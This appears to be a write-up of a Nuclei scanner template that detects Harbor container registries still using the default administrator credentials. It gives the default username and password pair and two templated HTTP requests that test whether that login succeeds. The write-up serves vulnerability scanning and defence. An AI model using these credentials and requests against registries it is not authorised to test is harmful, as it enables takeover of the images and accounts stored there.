# Nuclei Template: Harbor Registry - Default Admin Credentials
**Template ID:** harbor-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`harbor-registry-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected: The Harbor container registry was found to be using default administrator credentials (admin:Harbor12345). An attacker could have gained full administrative access to manage registries, projects, users, and stored container images.

## Steps to reproduce / Exploit Payload
```http
GET /api/v2.0/systeminfo HTTP/1.1
Host: {{Hostname}}
Accept: application/json

GET /api/v2.0/users/current HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ":" + password)}}
Accept: application/json
```

## References
- https://goharbor.io/docs/1.10/install-config/run-installer-script/
- https://goharbor.io/docs/latest/administration/managing-users/
